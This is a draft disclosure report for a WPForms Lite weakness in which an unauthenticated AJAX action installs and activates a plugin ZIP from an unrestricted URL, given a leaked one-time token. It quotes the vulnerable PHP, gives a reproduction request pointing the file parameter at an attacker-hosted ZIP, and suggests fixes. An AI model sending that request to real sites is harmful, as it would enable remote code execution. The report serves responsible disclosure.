# Patchstack / WPScan submission draft — WPForms Lite

Copy/paste into Patchstack's (patchstack.com/report) or WPScan's
submission form after logging into your own account. Not submitted
automatically — no API/account access exists for this from here.

---

**Title:** Unauthenticated arbitrary plugin installation via WPForms Connect upgrade flow (conditional on one-time-token disclosure)

**Plugin:** WPForms Lite — `wpforms-lite`

**Affected version reviewed:** `1.9.1.6` (commit `2dd679d2c3a20bf82d38ac3bd08ce4f20da72eb6`,
snapshot dated 2024-11-01 — **this is a stale mirror; re-verify against the
current release (1.9.9.2+) before relying on this report**, as the
current source could not be fetched from this environment.

**Vulnerability class:** CWE-494 (Download of Code Without Integrity
Check), with a CWE-306-adjacent design weakness (single-secret-gated
unauthenticated powerful action) and a minor CWE-208 (non-constant-time
comparison).

**Severity (suggested):** High, but conditional — see preconditions.

**Description:**

`src/Lite/Admin/Connect.php`'s `process()` method is registered via
`add_action( 'wp_ajax_nopriv_wpforms_connect_process', [ $this, 'process' ] )`
— reachable by any unauthenticated visitor. Given a valid one-time token
(`oth`), it downloads a ZIP from an attacker-suppliable `file` URL (only
run through `esc_url_raw()`, never checked against an allowlisted host)
and installs + auto-activates it as a WordPress plugin:

```php
$post_oth = ! empty( $_REQUEST['oth'] ) ? sanitize_text_field( wp_unslash( $_REQUEST['oth'] ) ) : '';
$post_url = ! empty( $_REQUEST['file'] ) ? esc_url_raw( wp_unslash( $_REQUEST['file'] ) ) : '';
$oth = get_option( 'wpforms_connect_token' );
if ( hash_hmac( 'sha512', $oth, wp_salt() ) !== $post_oth ) { wp_send_json_error( $error ); }
delete_option( 'wpforms_connect_token' );
$installer = new PluginSilentUpgrader( new ConnectSkin() );
$installer->install( $post_url );
$activated = activate_plugin( $plugin_basename, '', false, true );
```

The `oth` token is high-entropy (a SHA-512 HMAC keyed with the site's
`wp_salt()`) and cannot be brute-forced directly. However, the
architecture routes it through channels with real leak surface:
`generate_url()` (the admin-authenticated step that mints the token)
sends the browser to a third-party domain (`upgrade.wpforms.com`) with
the hashed token as a URL query parameter, **and** returns the same value
directly in the JSON body of its own AJAX response (`back_url`). Any of
the following would leak a working token: a Referer header leak to
`upgrade.wpforms.com` or any third-party resource it loads, browser
history/proxy/server logs, an XSS bug anywhere on the `wpforms-settings`
admin page, or a compromise of `upgrade.wpforms.com` itself. Given a
leaked token, the `file` URL is *not* restricted to `wpforms.com` — any
host works.

Additionally, the token comparison uses `!==` rather than `hash_equals()`
(non-constant-time; low practical severity for a 512-bit HMAC but still a
best-practice deviation).

**Steps to Reproduce (illustrative — requires the token-leak precondition,
not attempted against any live system):**

1. Obtain a valid `oth` value for a target site (via one of the leak
   channels described above; not independently reproduced by us).
2. Send `GET /wp-admin/admin-ajax.php?action=wpforms_connect_process&oth=<leaked_oth>&file=<attacker-hosted-zip-url>`
   with no authentication.
3. Observe the server downloads, installs, and activates the plugin at
   `file` — full code execution.

**Impact:** remote code execution — installing and auto-activating an
attacker-hosted "plugin" ZIP is equivalent to arbitrary PHP execution on
the server, achievable by anyone who obtains a single leaked token,
without ever authenticating to WordPress.

**Remediation:**
- Restrict `$post_url`'s host to an allowlist (e.g. only `wpforms.com`/a
  documented CDN domain) before passing to the installer.
- Use `hash_equals()` instead of `!==` for the token comparison.
- Consider a server-to-server confirmation call back to wpforms.com to
  validate the token before installing, rather than trusting whoever
  presents it — removing the third-party-redirect/AJAX-response leak
  surface entirely.

**Testing disclosure:** static source review only, against a ~1.5-year-old
mirror (no dedicated WPForms dev repo was reachable from this
environment) — no live WordPress installation was targeted or tested, and
**this finding must be re-verified against the current WPForms release
before being treated as applicable**. Full methodology documented at
`plugin-vuln-research/wpforms/FINDINGS.md` in the researcher's own working
repo, available on request.
